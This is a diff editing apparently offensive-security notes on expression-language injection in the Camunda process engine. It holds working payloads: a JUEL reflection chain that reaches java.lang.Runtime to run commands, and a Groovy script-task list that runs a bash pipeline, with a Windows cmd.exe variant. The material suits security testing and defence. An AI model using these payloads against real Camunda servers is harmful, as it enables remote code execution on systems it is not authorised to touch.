@@ -15,29 +15,24 @@ Camunda is a BPMN process and decision engine. Process models evaluate expressio
 
 ## Vulnerable pattern
 
-The exposure appears wherever expression text or a deployable model is assembled from untrusted input, for example a condition or delegate expression taken from user input, or a process variable interpolated into an evaluated expression:
+The exposure needs attacker control of the expression **text**, not merely of a variable the expression reads. A process variable interpolated with `${someVar}` returns the variable's value as data; that value is not recursively parsed as EL, so controlling the variable alone is not injection. The real entry points are where untrusted text becomes the expression itself:
 
 ```xml
-<conditionExpression xsi:type="tFormalExpression">${userControlled}</conditionExpression>
+<!-- untrusted input concatenated INTO the condition expression -->
+<conditionExpression xsi:type="tFormalExpression">${amount > USERINPUT}</conditionExpression>
 ```
 
-Camunda also evaluates expressions supplied through its REST API (for example condition evaluation and variable expressions), widening where injected EL can enter.
+or a deployable model the attacker can author, or an expression string handed to Camunda's REST API (the engine evaluates condition and expression fields it is given directly), which is the cleanest way in because the attacker supplies the EL text verbatim.
 
 ## Reaching the runtime through JUEL
 
-JUEL method resolution reaches `java.lang.Runtime`. An EL expression obtains the runtime and executes a command:
-
-```
-${Runtime.getRuntime().exec('id')}
-```
-
-Where `Runtime` is not directly resolvable in the EL context, pivot through an object's class to reach it:
+JUEL (standard Unified EL) has no `import`, no `new`, no array literals, and no class-literal syntax, so it cannot name `java.lang.Runtime` directly unless the application exposed a bean by that name. The portable path reaches the class through reflection from a string literal, then invokes the static `getRuntime`:
 
 ```
 ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
 ```
 
-Output is read back by wrapping the returned process stream in the same EL grammar.
+Output is read back by wrapping the returned process stream through further reflective calls in the same EL grammar.
 
 ## Script tasks are a more direct path
 
@@ -49,15 +44,15 @@ If the attacker controls a script task or an inline script expression, Camunda r
 
 A JavaScript (Nashorn/Graal) script task reaches `java.lang.Runtime` the same way. Because script tasks execute attacker code with no EL indirection, they are the cleaner sink wherever the process model or a script resource is controllable.
 
-## Shell features need an argument vector
+## Shell features need a script task
 
-`Runtime.exec(String)` tokenizes on whitespace with no shell, so `$(...)`, pipes, and redirection stay literal. Build the vector for shell behavior, shown in EL:
+`Runtime.exec(String)` tokenizes on whitespace with no shell, so `$(...)`, pipes, and redirection stay literal, and the reflective EL path above runs a single binary. JUEL cannot build a `String[]` argument vector (it has no `new` and no array literal), so shaping a shell invocation through pure EL is impractical. Where shell features are needed, the script-task path is the route: a Groovy script builds an explicit list and runs it through a shell.
 
+```groovy
+["/bin/bash","-c","id | base64 > /tmp/o"].execute()
 ```
-${Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','id > /tmp/o 2>&1'})}
-```
 
-On Windows use `new String[]{'cmd.exe','/c','whoami'}`. The Groovy `"...".execute()` form shells differently, so for pipes there build `["/bin/bash","-c","..."].execute()` with an explicit list.
+On Windows the list is `["cmd.exe","/c","whoami"]`.
 
 ## References
 
